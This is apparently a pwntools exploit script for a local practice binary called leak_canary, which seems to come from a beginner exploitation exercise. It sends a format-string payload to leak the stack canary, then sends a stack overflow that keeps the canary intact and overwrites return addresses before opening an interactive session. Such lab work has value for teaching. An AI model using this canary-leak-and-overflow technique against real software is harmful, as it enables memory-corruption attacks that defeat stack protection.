from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/64bit/stack_overflow/leak_canary/leak_canary")
pwn.gdb.attach(p)
payload = b""
payload += b'%9$p\n\x00'
p.send(payload)
p.recvuntil(b'')
canary = int(p.recvuntil(b'\n', drop=True)[0:], 16) + 0x0
pwn.log.success('canary:' + hex(canary))
payload = b"\x00" * 24
payload += p64(canary + 0x0) + p64(0x0) + p64(0x40059e) + p64(0x40076f)
p.send(payload)
p.interactive()
